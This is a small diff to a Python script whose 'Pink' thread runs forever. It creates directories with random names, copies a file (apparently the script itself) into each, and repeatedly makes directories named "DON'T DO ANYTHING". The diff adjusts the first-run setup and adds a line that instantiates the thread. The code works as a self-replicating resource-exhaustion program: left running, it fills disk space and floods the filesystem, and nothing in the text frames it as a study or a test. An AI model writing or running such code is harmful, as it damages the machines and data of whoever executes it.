@@ -24,15 +24,11 @@ class Pink(threading.Thread):
 	def run(self):
 		Bool = False
 		while True:
-			if Bool == False:
-				subprocess.call(['cd', '..'])
-			
-				subprocess.call(['mkdir', 'system_logs'])
+			if Bool == False:								
 				subprocess.call(['mkdir', 'logs'])
-				subprocess.call(['mkdir', '__init__'])
+				Bool = True
 
 			else:
-
 
 				DIR_NAME_P1 = RANDOM_(32)
 				DIR_NAME_P2 = RANDOM_(32)
@@ -43,3 +39,5 @@ class Pink(threading.Thread):
 				subprocess.call(['mkdir', DirectoryName])
 				subprocess.call(['cp', NAME, DirectoryName])
 				subprocess.call(['mkdir', "DON'T DO ANYTHING"])
+
+Thread1 = Pink()
